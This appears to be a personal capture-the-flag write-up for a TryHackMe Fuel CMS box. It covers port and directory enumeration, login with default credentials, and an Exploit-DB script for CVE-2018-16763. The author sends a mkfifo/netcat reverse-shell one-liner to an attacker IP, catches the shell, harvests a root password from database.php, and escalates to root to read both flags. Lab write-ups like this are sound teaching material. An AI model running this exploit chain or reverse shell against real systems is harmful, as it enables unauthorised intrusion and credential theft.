> [!summary]
> A new start-up has a few issues with their web server.
> Root the box! Designed and created by [DarkStar7471](https://tryhackme.com/p/DarkStar7471), built by [Paradox](https://tryhackme.com/p/Paradox).

> [!important]
> Target ip: 10.66.139.221

> [!important]
> Find User.txt

> [!info]
> Ok Root box is end goal. I need to enumerate. I'll use gobuster/nmap/browse the site for vulns.

> [!note]
> I ran the following scans and got the following results from nmap/gobuster/site respectively:

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -p- 10.66.139.221 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 04:42 EST
Nmap scan report for 10.66.139.221
Host is up (0.084s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/8%OT=80%CT=1%CU=33032%PV=Y%DS=3%DC=T%G=Y%TM=69885B27
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=I%TS=A)SEQ(SP=10
OS:2%GCD=1%ISR=10C%TI=Z%CI=I%TS=A)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%TS=A)S
OS:EQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=
OS:I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%O4=M4E8ST11NW7%
OS:O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W
OS:6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M4E8NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=40%CD=S)

Network Distance: 3 hops

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   83.58 ms 192.168.128.1
2   ...
3   83.90 ms 10.66.139.221

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.11 seconds
```
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.66.139.221/ -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.139.221/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/@                    (Status: 400) [Size: 1134]
/0                    (Status: 200) [Size: 16597]
/assets               (Status: 301) [Size: 315] [--> http://10.66.139.221/assets/]                                                                    
/home                 (Status: 200) [Size: 16597]
/index                (Status: 200) [Size: 16597]
/index.php            (Status: 200) [Size: 16597]
/lost+found           (Status: 400) [Size: 1134]
/offline              (Status: 200) [Size: 70]
/robots.txt           (Status: 200) [Size: 30]
/server-status        (Status: 403) [Size: 301]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

> [!info]
> before getting into the site section as its a lot of enumeration I did, nmap revealed only 1 port available which was port 80 and gobuster revealed a few filepaths to try so I included them below and will review them with more information.

![](assets/Fuel%20CMS%20v1.4%20main%20site.png)
![](assets/robots.txt.png)
![](assets/login%20with%20base64%20encoded.png)
![](assets/Pasted%20image%2020260208095840.png)
![](assets/admin%20login.png)
> [!note]
> As you can see, I am in with admin:admin already but i need to get a reverse shell to be able to get user & root flag as Fuel CMS version is 1.4 and CVE-2018-16763 targets this with RCE.

> [!note]
> Went on exploit DB and got a python script to spawn a pseudo-terminal shell setup which can be upgraded via reverse shell and python cmds as follows:

```
┌──(kali㉿kali)-[~]
└─$ python3 fuel_exploit.py -u http://10.66.139.221/
[+]Connecting...
Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.144.173 4444 >/tmp/f
```
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                                
listening on [any] 4444 ...
connect to [192.168.144.173] from (UNKNOWN) [10.66.139.221] 40596
bash: cannot set terminal process group (1041): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html$ ls
```
```
www-data@ubuntu:/var/www/html$ ls
ls
README.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
www-data@ubuntu:/var/www/html$ cd ..
cd ..
www-data@ubuntu:/var/www$  cd ..
 cd ..
www-data@ubuntu:/var$ cd ..
cd ..
www-data@ubuntu:/$ cd ..
cd ..
www-data@ubuntu:/$ whoami 
whoami
www-data
www-data@ubuntu:/$ cd root
cd root
bash: cd: root: Permission denied
www-data@ubuntu:/$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
www-data
www-data@ubuntu:/home$ cd w
cd www-data/
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cat fla
cat flag.txt 
6470e394cbf6dab6a91682cc8585059b 
```

> [!important]
> Found the User.txt flag as above

> [!info]
> Need to know how to privilege escalate now but I dont know sudo password...



```
$ cd ..
cd ..
$ cd ..
cd ..
$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr
cdrom  home  lib             media       proc  sbin  sys   var
$ cd fuel/application/config/config.php
cd fuel/application/config/config.php
/bin/sh: 18: cd: can't cd to fuel/application/config/config.php
$ fuel/application/config/config.php
fuel/application/config/config.php
/bin/sh: 19: fuel/application/config/config.php: not found
$ cd /fuel/application/config/config.php
cd /fuel/application/config/config.php
/bin/sh: 20: cd: can't cd to /fuel/application/config/config.php
$ cat /fuel/application/config/config.php
cat /fuel/application/config/config.php
cat: /fuel/application/config/config.php: No such file or directory
$ cd var
cd var
$ cd www
cd www
$ cd html
cd html
$ ls
ls
README.md  assets  composer.json  contributing.md  fuel  index.php  robots.txt
$ cd fuel
cd fuel
$ ls
ls
application  data_backup  install   modules
codeigniter  index.php    licenses  scripts
$ cd app
cd app
/bin/sh: 28: cd: can't cd to app
$ cd application
cd application
$ ls
ls
cache   controllers  helpers  index.html  libraries  migrations  third_party
config  core         hooks    language    logs       models      views
$ cd config
cd config
$ ls
ls
MY_config.php        constants.php      google.php     profiler.php
MY_fuel.php          custom_fields.php  hooks.php      redirects.php
MY_fuel_layouts.php  database.php       index.html     routes.php
MY_fuel_modules.php  doctypes.php       memcached.php  smileys.php
asset.php            editors.php        migration.php  social.php
autoload.php         environments.php   mimes.php      states.php
config.php           foreign_chars.php  model.php      user_agents.php
$ cat config.php
cat config.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
|--------------------------------------------------------------------------
| Base Site URL
|--------------------------------------------------------------------------
|
| URL to your CodeIgniter root. Typically this will be your base URL,
| WITH a trailing slash:
|
|       http://example.com/
|
| WARNING: You MUST set this value!
|
| If it is not set, then CodeIgniter will try guess the protocol and path
| your installation, but due to security concerns the hostname will be set
| to $_SERVER['SERVER_ADDR'] if available, or localhost otherwise.
| The auto-detection mechanism exists only for convenience during
| development and MUST NOT be used in production!
|
| If you need to allow multiple domains, remember that this file is still
| a PHP script and you can easily do that on your own.
|
*/
$config['base_url'] = BASE_URL;

/*
|--------------------------------------------------------------------------
| Index File
|--------------------------------------------------------------------------
|
| Typically this will be your index.php file, unless you've renamed it to
| something else. If you are using mod_rewrite to remove the page set this
| variable so that it is blank.
|
*/
$config['index_page'] = '';

/*
|--------------------------------------------------------------------------
| URI PROTOCOL
|--------------------------------------------------------------------------
|
| This item determines which server global should be used to retrieve the
| URI string.  The default setting of 'REQUEST_URI' works for most servers.
| If your links do not seem to work, try one of the other delicious flavors:
|
| 'REQUEST_URI'    Uses $_SERVER['REQUEST_URI']
| 'QUERY_STRING'   Uses $_SERVER['QUERY_STRING']
| 'PATH_INFO'      Uses $_SERVER['PATH_INFO']
|
| WARNING: If you set this to 'PATH_INFO', URIs will always be URL-decoded!
*/
$config['uri_protocol'] = 'REQUEST_URI';

/*
|--------------------------------------------------------------------------
| URL suffix
|--------------------------------------------------------------------------
|
| This option allows you to add a suffix to all URLs generated by CodeIgniter.
| For more information please see the user guide:
|
| https://codeigniter.com/user_guide/general/urls.html
*/
$config['url_suffix'] = '';

/*
|--------------------------------------------------------------------------
| Default Language
|--------------------------------------------------------------------------
|
| This determines which set of language files should be used. Make sure
| there is an available translation if you intend to use something other
| than english.
|
*/
$config['language']     = 'english';

/*
|--------------------------------------------------------------------------
| Default Character Set
|--------------------------------------------------------------------------
|
| This determines which character set is used by default in various methods
| that require a character set to be provided.
|
| See http://php.net/htmlspecialchars for a list of supported charsets.
|
*/
$config['charset'] = 'UTF-8';

/*
|--------------------------------------------------------------------------
| Enable/Disable System Hooks
|--------------------------------------------------------------------------
|
| If you would like to use the 'hooks' feature you must enable it by
| setting this variable to TRUE (boolean).  See the user guide for details.
|
*/
$config['enable_hooks'] = TRUE;

/*
|--------------------------------------------------------------------------
| Class Extension Prefix
|--------------------------------------------------------------------------
|
| This item allows you to set the filename/classname prefix when extending
| native libraries.  For more information please see the user guide:
|
| https://codeigniter.com/user_guide/general/core_classes.html
| https://codeigniter.com/user_guide/general/creating_libraries.html
|
*/
$config['subclass_prefix'] = 'MY_';

/*
|--------------------------------------------------------------------------
| Composer auto-loading
|--------------------------------------------------------------------------
|
| Enabling this setting will tell CodeIgniter to look for a Composer
| package auto-loader script in application/vendor/autoload.php.
|
|       $config['composer_autoload'] = TRUE;
|
| Or if you have your vendor/ directory located somewhere else, you
| can opt to set a specific path as well:
|
|       $config['composer_autoload'] = '/path/to/vendor/autoload.php';
|
| For more information about Composer, please visit http://getcomposer.org/
|
| Note: This will NOT disable or override the CodeIgniter-specific
|       autoloading (application/config/autoload.php)
*/
$config['composer_autoload'] = FALSE;

/*
|--------------------------------------------------------------------------
| Allowed URL Characters
|--------------------------------------------------------------------------
|
| This lets you specify which characters are permitted within your URLs.
| When someone tries to submit a URL with disallowed characters they will
| get a warning message.
|
| As a security measure you are STRONGLY encouraged to restrict URLs to
| as few characters as possible.  By default only these are allowed: a-z 0-9~%.:_-
|
| Leave blank to allow all characters -- but only if you are insane.
|
| The configured value is actually a regular expression character group
| and it will be executed as: ! preg_match('/^[<permitted_uri_chars>]+$/i
|
| DO NOT CHANGE THIS UNLESS YOU FULLY UNDERSTAND THE REPERCUSSIONS!!
|
*/
$config['permitted_uri_chars'] = 'a-z 0-9~%.:_\-';

/*
|--------------------------------------------------------------------------
| Enable Query Strings
|--------------------------------------------------------------------------
|
| By default CodeIgniter uses search-engine friendly segment based URLs:
| example.com/who/what/where/
|
| You can optionally enable standard query string based URLs:
| example.com?who=me&what=something&where=here
|
| Options are: TRUE or FALSE (boolean)
|
| The other items let you set the query string 'words' that will
| invoke your controllers and its functions:
| example.com/index.php?c=controller&m=function
|
| Please note that some of the helpers won't work as expected when
| this feature is enabled, since CodeIgniter is designed primarily to
| use segment based URLs.
|
*/
$config['enable_query_strings'] = FALSE;
$config['controller_trigger'] = 'c';
$config['function_trigger'] = 'm';
$config['directory_trigger'] = 'd';

/*
|--------------------------------------------------------------------------
| Allow $_GET array
|--------------------------------------------------------------------------
|
| By default CodeIgniter enables access to the $_GET array.  If for some
| reason you would like to disable it, set 'allow_get_array' to FALSE.
|
| WARNING: This feature is DEPRECATED and currently available only
|          for backwards compatibility purposes!
|
*/
$config['allow_get_array'] = TRUE;

/*
|--------------------------------------------------------------------------
| Error Logging Threshold
|--------------------------------------------------------------------------
|
| You can enable error logging by setting a threshold over zero. The
| threshold determines what gets logged. Threshold options are:
|
|       0 = Disables logging, Error logging TURNED OFF
|       1 = Error Messages (including PHP errors)
|       2 = Debug Messages
|       3 = Informational Messages
|       4 = All Messages
|
| You can also pass an array with threshold levels to show individual error types
|
|       array(2) = Debug Messages, without Error Messages
|
| For a live site you'll usually only enable Errors (1) to be logged otherwise
| your log files will fill up very fast.
|
*/
$config['log_threshold'] = 0;

/*
|--------------------------------------------------------------------------
| Error Logging Directory Path
|--------------------------------------------------------------------------
|
| Leave this BLANK unless you would like to set something other than the default
| application/logs/ directory. Use a full server path with trailing slash.
|
*/
$config['log_path'] = '';

/*
|--------------------------------------------------------------------------
| Log File Extension
|--------------------------------------------------------------------------
|
| The default filename extension for log files. The default 'php' allows for
| protecting the log files via basic scripting, when they are to be stored
| under a publicly accessible directory.
|
| Note: Leaving it blank will default to 'php'.
|
*/
$config['log_file_extension'] = '';

/*
|--------------------------------------------------------------------------
| Log File Permissions
|--------------------------------------------------------------------------
|
| The file system permissions to be applied on newly created log files.
|
| IMPORTANT: This MUST be an integer (no quotes) and you MUST use octal
|            integer notation (i.e. 0700, 0644, etc.)
*/
$config['log_file_permissions'] = 0644;

/*
|--------------------------------------------------------------------------
| Date Format for Logs
|--------------------------------------------------------------------------
|
| Each item that is logged has an associated date. You can use PHP date
| codes to set your own date formatting
|
*/
$config['log_date_format'] = 'Y-m-d H:i:s';

/*
|--------------------------------------------------------------------------
| Error Views Directory Path
|--------------------------------------------------------------------------
|
| Leave this BLANK unless you would like to set something other than the default
| application/views/errors/ directory.  Use a full server path with trailing slash.
|
*/
$config['error_views_path'] = '';

/*
|--------------------------------------------------------------------------
| Cache Directory Path
|--------------------------------------------------------------------------
|
| Leave this BLANK unless you would like to set something other than the default
| application/cache/ directory.  Use a full server path with trailing slash.
|
*/
$config['cache_path'] = APPPATH.'cache/';

/*
|--------------------------------------------------------------------------
| Cache Include Query String
|--------------------------------------------------------------------------
|
| Whether to take the URL query string into consideration when generating
| output cache files. Valid options are:
|
|       FALSE      = Disabled
|       TRUE       = Enabled, take all query parameters into account.
|                    Please be aware that this may result in numerous cache
|                    files generated for the same page over and over again.
|       array('q') = Enabled, but only take into account the specified list
|                    of query parameters.
|
*/
$config['cache_query_string'] = FALSE;

/*
|--------------------------------------------------------------------------
| Encryption Key
|--------------------------------------------------------------------------
|
| If you use the Encryption class, you must set an encryption key.
| See the user guide for more info.
|
| https://codeigniter.com/user_guide/libraries/encryption.html
|
*/
$config['encryption_key'] = '';

/*
|--------------------------------------------------------------------------
| Session Variables
|--------------------------------------------------------------------------
|
| 'sess_driver'
|
|       The storage driver to use: files, database, redis, memcached
|
| 'sess_cookie_name'
|
|       The session cookie name, must contain only [0-9a-z_-] characters
|
| 'sess_expiration'
|
|       The number of SECONDS you want the session to last.
|       Setting to 0 (zero) means expire when the browser is closed.
|
| 'sess_save_path'
|
|       The location to save sessions to, driver dependent.
|
|       For the 'files' driver, it's a path to a writable directory.
|       WARNING: Only absolute paths are supported!
|
|       For the 'database' driver, it's a table name.
|       Please read up the manual for the format with other session drivers.
|
|       IMPORTANT: You are REQUIRED to set a valid save path!
|
| 'sess_match_ip'
|
|       Whether to match the user's IP address when reading the session data.
|
|       WARNING: If you're using the database driver, don't forget to update
|                your session table's PRIMARY KEY when changing this setting.
|
| 'sess_time_to_update'
|
|       How many seconds between CI regenerating the session ID.
|
| 'sess_regenerate_destroy'
|
|       Whether to destroy session data associated with the old session ID
|       when auto-regenerating the session ID. When set to FALSE, the data
|       will be later deleted by the garbage collector.
|
| Other session cookie settings are shared with the rest of the application,
| except for 'cookie_prefix' and 'cookie_httponly', which are ignored here.
|
*/
$config['sess_driver'] = 'files';
$config['sess_cookie_name'] = 'ci_session';
$config['sess_expiration'] = 7200;
$config['sess_save_path'] = NULL;
$config['sess_match_ip'] = FALSE;
$config['sess_time_to_update'] = 300;
$config['sess_regenerate_destroy'] = FALSE;

/*
|--------------------------------------------------------------------------
| Cookie Related Variables
|--------------------------------------------------------------------------
|
| 'cookie_prefix'   = Set a cookie name prefix if you need to avoid collisions
| 'cookie_domain'   = Set to .your-domain.com for site-wide cookies
| 'cookie_path'     = Typically will be a forward slash
| 'cookie_secure'   = Cookie will only be set if a secure HTTPS connection exists.
| 'cookie_httponly' = Cookie will only be accessible via HTTP(S) (no javascript)
|
| Note: These settings (with the exception of 'cookie_prefix' and
|       'cookie_httponly') will also affect sessions.
|
*/
$config['cookie_prefix']        = '';
$config['cookie_domain']        = '';
$config['cookie_path']          = '/';
$config['cookie_secure']        = FALSE;
$config['cookie_httponly']      = FALSE;

/*
|--------------------------------------------------------------------------
| Standardize newlines
|--------------------------------------------------------------------------
|
| Determines whether to standardize newline characters in input data,
| meaning to replace \r\n, \r, \n occurrences with the PHP_EOL value.
|
| WARNING: This feature is DEPRECATED and currently available only
|          for backwards compatibility purposes!
|
*/
$config['standardize_newlines'] = FALSE;

/*
|--------------------------------------------------------------------------
| Global XSS Filtering
|--------------------------------------------------------------------------
|
| Determines whether the XSS filter is always active when GET, POST or
| COOKIE data is encountered
|
| WARNING: This feature is DEPRECATED and currently available only
|          for backwards compatibility purposes!
|
*/
$config['global_xss_filtering'] = FALSE;

/*
|--------------------------------------------------------------------------
| Cross Site Request Forgery
|--------------------------------------------------------------------------
| Enables a CSRF cookie token to be set. When set to TRUE, token will be
| checked on a submitted form. If you are accepting user data, it is strongly
| recommended CSRF protection be enabled.
|
| 'csrf_token_name' = The token name
| 'csrf_cookie_name' = The cookie name
| 'csrf_expire' = The number in seconds the token should expire.
| 'csrf_regenerate' = Regenerate token on every submission
| 'csrf_exclude_uris' = Array of URIs which ignore CSRF checks
*/
$config['csrf_protection'] = FALSE;
$config['csrf_token_name'] = 'csrf_test_name';
$config['csrf_cookie_name'] = 'csrf_cookie_name';
$config['csrf_expire'] = 7200;
$config['csrf_regenerate'] = TRUE;
$config['csrf_exclude_uris'] = array();

/*
|--------------------------------------------------------------------------
| Output Compression
|--------------------------------------------------------------------------
|
| Enables Gzip output compression for faster page loads.  When enabled,
| the output class will test whether your server supports Gzip.
| Even if it does, however, not all browsers support compression
| so enable only if you are reasonably sure your visitors can handle it.
|
| Only used if zlib.output_compression is turned off in your php.ini.
| Please do not use it together with httpd-level output compression.
|
| VERY IMPORTANT:  If you are getting a blank page when compression is enabled it
| means you are prematurely outputting something to your browser. It could
| even be a line of whitespace at the end of one of your scripts.  For
| compression to work, nothing can be sent before the output buffer is called
| by the output class.  Do not 'echo' any values with compression enabled.
|
*/
$config['compress_output'] = FALSE;

/*
|--------------------------------------------------------------------------
| Master Time Reference
|--------------------------------------------------------------------------
|
| Options are 'local' or any PHP supported timezone. This preference tells
| the system whether to use your server's local time as the master 'now'
| reference, or convert it to the configured one timezone. See the 'date
| helper' page of the user guide for information regarding date handling.
|
*/
$config['time_reference'] = 'local';

/*
|--------------------------------------------------------------------------
| Rewrite PHP Short Tags
|--------------------------------------------------------------------------
|
| If your PHP installation does not have short tag support enabled CI
| can rewrite the tags on-the-fly, enabling you to utilize that syntax
| in your view files.  Options are TRUE or FALSE (boolean)
|
| Note: You need to have eval() enabled for this to work.
|
*/
$config['rewrite_short_tags'] = TRUE;

/*
|--------------------------------------------------------------------------
| Reverse Proxy IPs
|--------------------------------------------------------------------------
|
| If your server is behind a reverse proxy, you must whitelist the proxy
| IP addresses from which CodeIgniter should trust headers such as
| HTTP_X_FORWARDED_FOR and HTTP_CLIENT_IP in order to properly identify
| the visitor's IP address.
|
| You can use both an array or a comma-separated list of proxy addresses,
| as well as specifying whole subnets. Here are a few examples:
|
| Comma-separated:      '10.0.1.200,192.168.5.0/24'
| Array:                array('10.0.1.200', '192.168.5.0/24')
*/
$config['proxy_ips'] = '';
$ ls
ls
MY_config.php        constants.php      google.php     profiler.php
MY_fuel.php          custom_fields.php  hooks.php      redirects.php
MY_fuel_layouts.php  database.php       index.html     routes.php
MY_fuel_modules.php  doctypes.php       memcached.php  smileys.php
asset.php            editors.php        migration.php  social.php
autoload.php         environments.php   mimes.php      states.php
config.php           foreign_chars.php  model.php      user_agents.php
$ cat database.php
cat database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
|       ['cachedir'] The path to the folder where cache files should be stored
|       ['char_set'] The character set used in communicating with the database
|       ['dbcollat'] The character collation used in communicating with the database
|                                NOTE: For MySQL and MySQLi databases, this setting is only used
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|                                (and in table creation queries made with DB Forge).
|                                There is an incompatibility in PHP with mysql_real_escape_string() which
|                                can make your site vulnerable to SQL injection if you are using a
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
$ su root
su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# cd ~
cd ~
root@ubuntu:~# cd root
cd root
bash: cd: root: No such file or directory
root@ubuntu:~# pwd
pwd
/root
root@ubuntu:~# cat\
cat\
> ls
ls
catls: command not found
root@ubuntu:~# ls -la
ls -la
total 32
drwx------  4 root root 4096 Jul 26  2019 .
drwxr-xr-x 24 root root 4096 Jul 26  2019 ..
-rw-------  1 root root  357 Jul 26  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Feb 26  2019 .cache
drwxr-xr-x  2 root root 4096 Jul 26  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   34 Jul 26  2019 root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d 
root@ubuntu:~# 

```